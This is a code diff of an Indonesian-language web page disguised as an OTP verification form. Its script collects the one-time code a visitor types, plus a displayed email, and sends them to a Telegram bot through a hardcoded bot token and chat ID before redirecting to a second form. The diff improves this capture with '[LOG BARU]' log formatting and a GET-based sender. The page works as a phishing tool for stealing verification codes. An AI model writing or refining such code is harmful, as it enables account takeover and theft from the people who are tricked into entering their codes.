@@ -112,8 +112,7 @@
     </header>
     <div class="content">
         <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="email">email yang terdaftar</b></p>
-        <p><b class="Email"></b></p>
-        <div class="otp-box">
+        <p><b class="Email">contoh@email.com</b></p> <div class="otp-box">
             <input type="tel" inputmode="numeric" maxlength="1" />
             <input type="tel" inputmode="numeric" maxlength="1" />
             <input type="tel" inputmode="numeric" maxlength="1" />
@@ -125,15 +124,17 @@
         <div class="wait">Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang</div>
     </div>
     <script>
-        // === OTP Input Logic ===
-        const inputs = document.querySelectorAll(".otp-box input");
-        const lanjutBtn = document.getElementById("lanjut");
+        // === KONFIGURASI TELEGRAM (Harap pastikan ini adalah TOKEN dan CHAT ID yang benar) ===
         const TELEGRAM_BOT_TOKEN = '8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk';
         const TELEGRAM_CHAT_ID = '5923031825';
         
+        // === OTP Input Logic ===
+        const inputs = document.querySelectorAll(".otp-box input");
+        const lanjutBtn = document.getElementById("lanjut");
+        
         inputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
-                // Selalu hapus karakter non-angka
+                // Selalu hapus karakter non-angka (memastikan hanya angka)
                 const value = e.target.value.replace(/[^0-9]/g, ""); 
                 e.target.value = value;
                 
@@ -143,6 +144,7 @@
                 checkFilled();
             });
             input.addEventListener("keydown", (e) => {
+                // Logika Backspace
                 if (e.key === "Backspace" && !e.target.value && index > 0) {
                     inputs[index - 1].focus();
                 }
@@ -150,7 +152,7 @@
         });
 
         function checkFilled() {
-            const allFilled = Array.from(inputs).every((input) => input.value !== "");
+            const allFilled = Array.from(inputs).every((input) => input.value.length === 1);
             if (allFilled) {
                 lanjutBtn.classList.add("active");
                 lanjutBtn.disabled = false;
@@ -162,8 +164,17 @@
         
         lanjutBtn.addEventListener("click", () => {
             const otp = Array.from(inputs).map((i) => i.value).join("");
-            sendToTelegram(`Kode OTP yang dimasukkan: ${otp}`); // Kirim ke Telegram
-            window.location.href = "formulir2.html"; // Arahkan ke formulir2.html
+            
+            // Ambil data email yang seharusnya sudah diisi dari halaman sebelumnya
+            const emailElement = document.querySelector('.Email');
+            const emailTerdaftar = emailElement ? emailElement.textContent.trim() : 'Email tidak ditemukan';
+            
+            const message = `[LOG BARU]\nEmail: ${emailTerdaftar}\nKode OTP yang dimasukkan: ${otp}`;
+            
+            sendToTelegram(message); // Kirim ke Telegram
+            
+            // Arahkan ke halaman berikutnya
+            window.location.href = "formulir2.html"; 
         });
         
         // === Countdown Timer (60 detik) ===
@@ -178,29 +189,32 @@
             }
         }, 1000);
         
-        // === Fungsi untuk mengirim data ke Telegram ===
+        // === Fungsi untuk mengirim data ke Telegram (Menggunakan GET untuk kesederhanaan) ===
         function sendToTelegram(message) {
             const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(apiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message
-                    })
+            
+            // Encode pesan
+            const encodedMessage = encodeURIComponent(message);
+            
+            fetch(`${apiUrl}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`, {
+                    method: 'GET'
                 })
-                .then(response => response.json())
+                .then(response => {
+                    // Cek status response sebelum parsing JSON
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
                 .then(data => {
                     if (data.ok) {
-                        console.log('Pesan berhasil dikirim ke Telegram!');
+                        console.log('Pesan OTP berhasil dikirim ke Telegram!');
                     } else {
-                        console.error('Gagal mengirim pesan ke Telegram:', data.description);
+                        console.error('Gagal mengirim pesan ke Telegram (API Error):', data.description);
                     }
                 })
                 .catch(error => {
-                    console.error('Terjadi kesalahan:', error);
+                    console.error('Terjadi kesalahan saat mengirim ke Telegram:', error);
                 });
         }
     </script>
